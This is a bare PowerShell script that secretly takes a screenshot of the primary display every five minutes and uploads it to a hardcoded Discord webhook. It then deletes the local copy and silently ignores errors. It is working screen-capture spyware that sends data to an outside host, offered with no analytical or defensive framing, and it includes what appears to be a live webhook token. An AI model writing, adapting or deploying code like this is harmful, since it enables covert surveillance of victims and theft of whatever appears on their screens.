Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhook = 'https://discord.com/api/webhooks/1473072881024892998/XWwbEQwmsG5Kndc2Kfl_U_3xkb8H2z3d9r6SPSlHHlmoLQ6sEAG3sq7pTniLtLf9XiM8'

function Capture-Screen {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $path = "$env:TEMP\screen_$timestamp.png"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    
    $graphics.Dispose()
    $bitmap.Dispose()
    return $path
}

function Send-ToWebhook($imagePath) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $bytes = [System.IO.File]::ReadAllBytes($imagePath)
        $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
        
        $body = "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`n"
        $body += "Content-Type: image/png`r`n`r`n"
        $body += $enc.GetString($bytes)
        $body += "`r`n--$boundary--`r`n"
        
        $headers = @{'Content-Type' = "multipart/form-data; boundary=$boundary"}
        Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $enc.GetBytes($body)
        Remove-Item $imagePath -Force
    } catch {}
}

while($true) {
    $img = Capture-Screen
    Send-ToWebhook $img
    Start-Sleep -Seconds 300
}